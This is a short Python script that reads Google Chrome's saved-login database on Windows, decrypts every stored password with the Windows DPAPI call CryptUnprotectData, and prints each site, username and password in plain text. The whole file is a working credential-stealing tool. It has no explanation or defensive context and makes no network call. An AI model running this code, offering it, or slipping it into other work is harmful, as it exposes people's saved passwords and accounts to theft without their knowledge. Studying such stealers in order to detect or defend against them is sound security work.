import os
import sqlite3
import win32crypt

CHROME_PATH = "/AppData/Local/Google/Chrome/User Data/Default/Login Data"


def main():
    data_path = "/".join(os.path.expanduser('~').split("\\")) + CHROME_PATH
    c = sqlite3.connect(data_path)
    cursor = c.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    login_data = cursor.fetchall()
    cred= {}
    for url, user_name, pwd, in login_data:
        pwd = win32crypt.CryptUnprotectData(pwd) #This returns a tuple description and the password
        cred[url] = (user_name, pwd[1].decode('utf-8'))
        print(f"URL = {url}  USERNAME = {user_name}  PASSWORD = {pwd[1].decode('utf-8')}")


if __name__ == '__main__':
    main()